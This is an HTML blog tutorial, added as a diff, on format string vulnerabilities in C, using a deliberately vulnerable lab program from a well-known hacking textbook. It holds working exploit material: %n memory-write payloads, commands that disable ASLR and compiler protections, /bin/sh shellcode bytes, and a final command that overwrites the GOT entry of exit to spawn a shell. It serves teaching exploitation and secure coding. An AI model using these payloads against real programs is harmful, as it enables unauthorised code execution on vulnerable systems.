@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.github.io/blog/format_string_vuln/"><!-- Primary Meta Tags --><title>Format string vulnerability</title><meta name="title" content="Format string vulnerability"><meta name="description" content="todo"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.github.io/blog/format_string_vuln/"><meta property="og:title" content="Format string vulnerability"><meta property="og:description" content="todo"><meta property="og:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.github.io/blog/format_string_vuln/"><meta property="twitter:title" content="Format string vulnerability"><meta property="twitter:description" content="todo"><meta property="twitter:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><link rel="stylesheet" href="/_astro/_slug_.D-Spfgqn.css">
+<style>code[class*=language-],pre[class*=language-]{color:#f5f5f5;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2);background:none;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#34294f}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#969896}.token.punctuation{color:#ccc}.token.selector{color:#72f1b8;text-shadow:0 0 2px #100c0f,0 0 10px rgba(37,124,85,.4588235294),0 0 35px rgba(33,39,36,.4588235294)}.token.function-name{color:#6196cc}.token.constant,.token.symbol{color:#f92aad;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2)}.token.attr-value,.token.char,.token.regex,.token.variable{color:#f87c32}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.token.string{color:#90ee90}.token.class-name,.token.deleted,.token.directive.keyword+.token.string,.token.hexcode,.token.namespace,.token.tag,.token.unit{color:#fff;text-shadow:0 0 1px #ff4d4d,0 0 2px #ff4d4d,0 0 4px #ff4d4d,0 0 10px #ff4d4d,0 0 20px #ff4d4d}.token.macro{color:#fff;text-shadow:0 0 1px #f8d132,0 0 2px #f8d132,0 0 4px #f8d132,0 0 10px #f8d132,0 0 20px #f8d132}.token.attr-name,.token.boolean,.token.function,.token.selector .token.id{color:#fff;text-shadow:0 0 1px #00f2ff,0 0 2px #00f2ff,0 0 4px #00f2ff,0 0 10px #00f2ff,0 0 20px #00f2ff}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector .token.class,.token.token.directive-hash{color:#fff;text-shadow:0 0 1px #bd32f8,0 0 2px #bd32f8,0 0 4px #bd32f8,0 0 10px #bd32f8,0 0 20px #bd32f8}main[data-astro-cid-bvzihdzo]{width:100%;background-color:#222}.hero-image[data-astro-cid-bvzihdzo]{width:40ch;max-width:100%;margin:auto}.hero-image[data-astro-cid-bvzihdzo] img[data-astro-cid-bvzihdzo]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-bvzihdzo]{width:80ch;max-width:100%;margin:auto;color:#d3d3d3}.title[data-astro-cid-bvzihdzo]{margin-bottom:1rem;padding:1rem 0;text-align:center;line-height:1}.title[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0 0 .5rem}.date[data-astro-cid-bvzihdzo]{margin-bottom:.5rem;color:#fff}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}.title-name[data-astro-cid-bvzihdzo]{font-family:Iceland;color:#fff}.prose[data-astro-cid-bvzihdzo] img{display:flex;margin:0 auto 2em}.prose[data-astro-cid-bvzihdzo] p{margin-bottom:2em}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  <a href="/blog" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blog </a>  <a href="/open-source" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Open Source </a>  </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="hero-image" data-astro-cid-bvzihdzo> <img src="/_astro/format-string-vuln.DlCIcyQp_OjPKU.webp" alt="" data-astro-cid-bvzihdzo width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2024-01-29T00:00:00.000Z"> Jan 29, 2024 </time>  </div> <h1 class="title-name" data-astro-cid-bvzihdzo>Format string vulnerability</h1> <hr data-astro-cid-bvzihdzo> </div>  <ul>
+<li><a href="#whats-a-format-string-vulnerability">What’s a format string
+vulnerability?</a></li>
+<li><a href="#whats-the-problem">What’s the problem?</a></li>
+<li><a href="#format-string-vulnerability-demo">Format String vulnerability
+demo</a></li>
+<li><a href="#write-to-memory-address">Write to memory address</a></li>
+<li><a href="#write-arbitrary-bytes-to-memory-address">Write arbitrary bytes to memory
+address</a></li>
+<li><a href="#direct-access-and-short-writes">Direct access and short writes</a></li>
+<li><a href="#overwrite-global-offset-table-to-get-a-shell">Overwrite Global Offset Table to get a
+shell</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h1 id="whats-a-format-string-vulnerability">What’s a format string vulnerability?</h1>
+<p>A format string vulnerability is a type of bug that can happen when we
+process user input with format strings. For example, C has several
+functions that allow it to do that. One of them is <code>printf</code> (e.g.
+<code>printf("I am %i years old", 999);</code>). An attacker can exploit them to
+read and write to arbitrary memory locations, execute arbitrary code or
+make the program crash.</p>
+<h1 id="whats-the-problem">What’s the problem?</h1>
+<p>The main problem is that the format string, when unchecked, let’s user
+insert format parameters to read and write memory addresses inside and
+before the stack. For example, let’s take the following C line of code.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %x %x"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>If we run it, the output will be <code>hello 3 7</code>. The parameters are pushed
+into the stack in reverse order. It pushes the 7, the 3, and the address
+of the format string. However, if we remove the 7 and rerun it, we will
+see something like <code>hello 3 0xbfffff8b</code>. The format string will get the
+data from where the argument should have been placed. In that case, from
+the first address below the stack frame.</p>
+<h1 id="format-string-vulnerability-demo">Format String vulnerability demo</h1>
+<p>All the vulnerable programs are from Hacking: The Art of Exploitation,
+2nd Edition. You can get the original source code
+<a href="https://github.com/intere/hacking/blob/master/booksrc">https://github.com/intere/hacking/blob/master/booksrc</a>.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token keyword">char</span> text<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token keyword">static</span> <span class="token keyword">int</span> test_val <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">;</span>
+
+   <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;text to print>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+   <span class="token function">strcpy</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The right way to print user-controlled input:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe wrong way to print user-controlled input:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">// Debug output</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] test_val @ 0x%08x = %d 0x%08x\n"</span><span class="token punctuation">,</span> <span class="token operator">&#x26;</span>test_val<span class="token punctuation">,</span> test_val<span class="token punctuation">,</span> test_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The code is quite self-explanatory. The vulnerable line of code is:
+<code>printf(text)</code>. Notice that it will print whatever the user feeds to it
+as input. We can pass any format string that we want. Before continuing,
+let’s see how to compile the program.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc fmt_vuln.c <span class="token parameter variable">-o</span> fmt.out -fno-stack-protector -no-pie <span class="token parameter variable">-m32</span>
+</code></pre>
+<ul>
+<li><code>-fno-stack-protector</code> to disable canaries</li>
+<li><code>-no-pie</code> to disable Position Independent Executable</li>
+<li><code>-m32</code> to compile it as a 32 bit binary</li>
+</ul>
+<p>Let’s continue with the exploit. The following image shows two
+executions.</p>
+<p><img  src="/_astro/print-input-vuln.COUbkaB4_G2yrf.webp" alt="" width="833" height="230" loading="lazy" decoding="async"></p>
+<p>The first executions gets <code>"something"</code> as input. The output is the
+expected one. The interesting part is in the second execution, where we
+pass <code>$(printf "\x2c\xc0\x04\x08").%08x.%08x.%08x.%n</code> as input (the dots
+are just to make the output clearer). As a result, we overwrite the
+<code>test_val</code> variable. How is that possible? Let’s see. The format string
+is crafted to accomplish three things. First, we push the <code>test_val</code>
+memory address into the stack with <code>$(printf "\x2c\xc0\x04\x08")</code>.
+Second, we read memory address until we reach the data we inserted at
+the beginning of the format string with <code>%08x.%08x.%08x</code>. I didn’t know
+beforehand that I needed to read three addresses, I checked it manually.
+Third and last, we overwrite the data in <code>test_val</code> with the number of
+characters printed by printf with <code>%n</code>. For clarification, when we call
+<code>%n</code>, we already traversed all the memory addresses until the one
+containing <code>\x2c\xc0\x04\x08</code>. Therefore, <code>%n</code> overwrites the data in
+that memory address, which happens to be <code>test_val</code>.</p>
+<p>Similarly, if we increment the width of some of the format string
+parameters, we can overwrite <code>test_val</code> with higher values.</p>
+<p><img  src="/_astro/print-input-vuln-400.COjJOiJE_Z1z182c.webp" alt="" width="846" height="153" loading="lazy" decoding="async"></p>
+<p>That’s seemingly stupid thing is really powerful. We can overwrite
+memory addresses with whatever value we want (e.g another memory
+address). That’s the idea of the exploit. Let’s jump to the following
+exercise.</p>
+<h1 id="write-to-memory-address">Write to memory address</h1>
+<p>In that first exercise, we will see how to overwrite the value with the
+memory address <code>ddccbbaa</code>. Of course, you can follow these steps to
+overwrite it with any other memory address of your liking. The only
+prerequisite is that the hexadecimal values of each byte must be greater
+than the value of the following one.</p>
+<p>To write <code>ddccbbaa</code>, we need go byte by byte. We cannot write them at
+once. That means that <code>$(printf "\x2c\xc0\x04\x08")</code> won’t be enough. We
+need to push the following three memory addresses into the stack. We can
+do that with something like
+<code>$(printf "{address 1}{address 2}{address 3}{address 4}")</code>. Besides, we
+also need to overwrite them. For example,
+<code>$(printf "{address 1}{address 2}{address 3}{address 4}").%08x.%08x.%{number 1}x%n%{number 2}x%n%{number 3}x%n%{number 4}%n</code>,
+where each <code>%{number}%n</code> is overwriting one byte. There’s one issue,
+though. We must add 4 bytes between each memory address so that each
+<code>%n</code> overwrites the correct memory address. Remember, each format
+parameter is reading a memory address from the stack. If we don’t add 4
+bytes between each address, the <code>%{number}x</code> would read one of the
+memory addresses we want to overwrite. Thus, we want something similar
+to
+<code>$(printf "{address 1}JUNK{address 2}JUNK{address 3}JUNK{address 4}").%08x.%08x.%{number 1}x%n%{number 2}x%n%{number 3}x%n%{number 4}%n</code>.</p>
+<p>Great! We have the structure, but how do we compute the numbers for each
+<code>%x</code>?</p>
+<p>For the firts byte, we want to execute the command</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">./fmt.out <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>JUNK<span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>JUNK<span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>JUNK<span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>"</span><span class="token variable">)</span></span>.%08x.%08x.%08x.%n
+</code></pre>
+<p>which will give us the value of <code>test_val</code> (56). With that, we can
+compute the first number with the formula “expected value - initial
+value + 8”. That will give us the distance from the actual value stored
+in the variable to the value we want. The ”+ 8” comes from the 8 digits
+we are inserting in the <code>%08x</code> that appears before <code>%n</code>. We can compute
+this with gdb.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--ex</span> <span class="token string">"p 0xaa - 56 + 8"</span>
+</code></pre>
+<p>Now, we can execute the following to get the first byte.</p>
+<p><img  src="/_astro/first-byte.DCKFw7bV_Z1XctRF.webp" alt="" width="1447" height="112" loading="lazy" decoding="async"></p>
+<p>For the following bytes, we have to do the same. However, to compute the
+numbers, we will use the formula “expected value - previous written
+value”.</p>
+<p><img  src="/_astro/ddccbbaa.CYNX11m6_8MlRJ.webp" alt="" width="1629" height="398" loading="lazy" decoding="async"></p>
+<p>Awesome! We know how to overwrite memory addresses, but we are rather
+limited. The bytes must be ordered in descending value. What if we want
+to write any arbitrary memory address? We cannot do something like
+<code>%-10x%n</code>. What do we do in those situations?</p>
+<h1 id="write-arbitrary-bytes-to-memory-address">Write arbitrary bytes to memory address</h1>
+<p>The solution for that is straigth forward. We want to “wrap” the smaller
+byte. In other words, instead of computing “expected value - previous
+written value” we will compute “1(expected value) - previous written
+value” (e.g. 0x1aa - 0xbb given that we want to write 0xaa). The
+procedure stays the same.</p>
+<p><img  src="/_astro/aaccaabb.BWZJPyYh_1takuB.webp" alt="" width="1645" height="437" loading="lazy" decoding="async"></p>
+<p>Amazing! But this is to much work, can’t we simplify it a little bit?</p>
+<h1 id="direct-access-and-short-writes">Direct access and short writes</h1>
+<p>There are two ways to simplify the process. First, we can use direct
+access to avoid writing numerous format parameters. We can use <code>%n$d</code>
+where <code>%n</code> indicates the argument position and <code>$d</code> indicates the format
+parameter type.</p>
+<p><img  src="/_astro/direct-access.DFiOP_Oi_2jWsAs.webp" alt="" width="469" height="113" loading="lazy" decoding="async"></p>
+<p>We can simplify what we did in the previous section. Be aware that the
+structure changes a bit. We want to use
+<code>$(printf "{address 1}{address 2}{address 3}{address 4}")%{number 1}x%4\$n%{number 2}x%5\$n%{number 3}x%6\$n%{number 4}x%7\$n%</code>.
+Notice that we no longer need:</p>
+<ul>
+<li>the padding between memory addresses</li>
+<li>to add 8 when computing the first value</li>
+</ul>
+<p><img  src="/_astro/direct-access-aaccaabb.CKs261TV_Z29gxSD.webp" alt="" width="1526" height="437" loading="lazy" decoding="async"></p>
+<p>But that’s not all. We can also use short writes to write two bytes at
+once. We need to use <code>%n$hd</code>, remove the second and fourth memory
+addresses, and compute the new values.</p>
+<p><img  src="/_astro/short-write.BNwfBMRz_Z1TKz1L.webp" alt="" width="1047" height="289" loading="lazy" decoding="async"></p>
+<p><img  src="/_astro/short-write-result.BC_uFMi9_DAlam.webp" alt="" width="506" height="45" loading="lazy" decoding="async"></p>
+<p>Pretty neat, eh? With that knowledge, we could get a shell if we wanted
+to.</p>
+<h1 id="overwrite-global-offset-table-to-get-a-shell">Overwrite Global Offset Table to get a shell</h1>
+<p>The Global Offset Table (GOT) is a section of a computer program that
+holds the memory addresses of functions that are dinamically linked.
+It’s useful to call functions from shared libraries. We will rewrite a
+memory address there with the address of our shellcode, but first, let’s
+see how to compile the program.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc fmt_vuln.c <span class="token parameter variable">-o</span> fmt.out -fno-stack-protector -no-pie <span class="token parameter variable">-z</span> norelro <span class="token parameter variable">-z</span> execstack <span class="token parameter variable">-m32</span>
+</code></pre>
+<p>Notice that we added <code>-z norelro</code> to allow overwriting memory addresses
+in the GOT, and <code>-z execstack</code> to require executable stack.</p>
+<p>We also need to disable the Adress Space Layout Randomization (ASLR) to
+avoid random memory addreses.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space
+</code></pre>
+<p>Now, the idea is pretty simple. We want to overwrite the memory address
+of the <code>exit</code> function in the GOT table. For that, we will need a couple
+of things.</p>
+<p>We need a 32 bits shellcode. We can get one with the following C
+program. I got it from <a href="https://shell-storm.org/">https://shell-storm.org/</a>.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+
+<span class="token keyword">char</span> <span class="token operator">*</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"</span>
+  <span class="token string">"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token string">"Length: %d\n"</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> shellcode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>We also need a program to get the shellcode address. We will store in an
+environment variable.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;environment variable> &#x3C;target program name>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  ptr <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* get env var location */</span>
+  ptr <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* adjust for program name */</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s will be at %p\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>From that point, the procedure is pretty straight forward.</p>
+<ol>
+<li>
+<p>Store shellcode in an environment variable</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">SHELLCODE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> shellcode.bin<span class="token variable">)</span></span>
+</code></pre>
+</li>
+<li>
+<p>Get shellcode address</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">./getenv.out SHELLCODE ./fmt.out 
+</code></pre>
+</li>
+<li>
+<p>Compute the values we will put at the format string exploit for the
+given shellcode address</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--ex</span> <span class="token string">"p 0xffff - 8"</span>
+<span class="token comment"># 65527</span>
+gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--ex</span> <span class="token string">"p 0x1d9b8 - 0xffff"</span>
+<span class="token comment"># 55737</span>
+</code></pre>
+</li>
+<li>
+<p>Get <code>exit</code> address in GOT</p>
+<img src="../../images/format_string_vuln/got-table.png" class="centered-image">
+</li>
+<li>
+<p>Exploit</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">./fmt.out <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>"</span><span class="token variable">)</span></span>%65527x%4<span class="token punctuation">\</span><span class="token variable">$hn</span>%55737x%5<span class="token punctuation">\</span><span class="token variable">$hn</span>
+</code></pre>
+<img src="../../images/format_string_vuln/shell-execution.png" class="centered-image">
+</li>
+</ol>
+<h1 id="conclusion">Conclusion</h1>
+<p>Don’t execute format string inputted by the users. Thanks. That will
+save you lots of headaches.</p>  </div> </article> </main> <footer></footer> </body></html>
